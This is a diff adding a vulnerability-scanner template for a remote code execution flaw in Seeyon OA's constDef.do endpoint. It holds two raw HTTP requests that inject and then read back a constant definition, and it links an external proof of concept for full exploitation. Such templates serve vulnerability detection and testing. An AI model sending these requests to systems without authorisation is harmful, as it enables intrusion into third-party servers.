@@ -1,0 +1,30 @@
+id: seeyon-oa-constdef-rce
+
+info:
+  name: Seeyon OA constDef.do - Remote Code Execution
+  author: qwtd
+  severity: critical
+  description: |
+    Seeyon OA constDef.do 远程代码执行漏洞，攻击者可利用该漏洞执行任意代码，后利用看reference。
+  reference:
+    - https://github.com/wy876/POC/blob/17fce9e8a8e4c711753f586f24a2b8351f367aee/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9FconstDef%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  tags: 致远互联-OA
+
+http:
+  - raw:
+      - |
+        GET /seeyon/constDef.do?method=newConstDef&constKey={{randstr}}&constDefine=1&constDescription=123&constType=4 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /seeyon/ajax.do?method=ajaxAction&managerName=constDefManager&rnd=123123123&managerMethod=listPage&arguments=%5B%7B%22page%22%3A1%2C%22size%22%3A20%7D%2C%7B%7D%5D HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - contains(body_1, "error\":\"ok")
+          - status_code_2 == 200
+          - contains(body_2, "constKey\":\"{{randstr}}")
+        condition: and
